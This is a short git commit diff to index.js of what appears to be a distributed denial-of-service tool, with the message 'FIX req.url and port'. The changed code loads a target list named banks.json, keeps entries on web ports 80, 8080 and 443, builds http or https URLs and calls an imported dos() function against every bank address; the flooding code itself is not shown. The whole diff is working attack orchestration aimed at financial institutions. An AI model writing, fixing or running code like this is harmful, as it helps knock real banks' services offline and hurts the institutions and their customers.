b2e66a0cd8c5e6dd214a994caa9c055346da01b3
rchomko <romanmediapr@gmail.com>
2022-02-27 15:55:59 +0200

    FIX req.url and port

--- index.js
+++ index.js
@@ -1,5 +1,10 @@
 const { dos } = require("./controllers/ddos.js");
 const banks = require("./targets/banks.json");
-banks.map(({ ip_str, port }) => {
-  dos(`${ip_str}:${port}`, 150, 500);
-});
+const allowedPorts = [80, 8080, 443];
+
+banks
+  .filter(({ port }) => allowedPorts.includes(port))
+  .map(({ ip_str, port }) => {
+    const protocol = port === 443 ? "https://" : "http://";
+    dos(`${protocol}${ip_str}:${port}`, 150, 0);
+  });
